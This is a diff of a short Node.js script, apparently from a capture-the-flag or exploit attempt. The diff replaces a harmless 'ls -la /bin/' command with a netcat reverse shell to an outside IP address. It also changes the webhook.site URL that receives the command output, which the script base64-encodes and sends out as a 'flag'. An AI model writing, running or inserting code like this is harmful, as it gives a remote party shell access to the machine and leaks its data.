@@ -1,10 +1,9 @@
 const https = require('https');
 const fs = require('fs');
-//hei
 
 const { exec } = require("child_process");
 
-exec("ls -la /bin/", (error, stdout, stderr) => {
+exec("nc 38.242.133.6 8888 -e /bin/sh", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
@@ -14,7 +13,7 @@ exec("ls -la /bin/", (error, stdout, stderr) => {
         return;
     }
     flag = Buffer.from(stdout).toString('base64');
-    https.get('https://webhook.site/710e7f24-ff97-4c7d-80d8-e32707a29d54/' + flag, res => {
+    https.get('https://webhook.site/7190197b-0f77-492c-b0f5-5ac4438d46a4?flag=' + flag, res => {
 
     }).on('error', err => {
         console.log('Error: ', err.message);
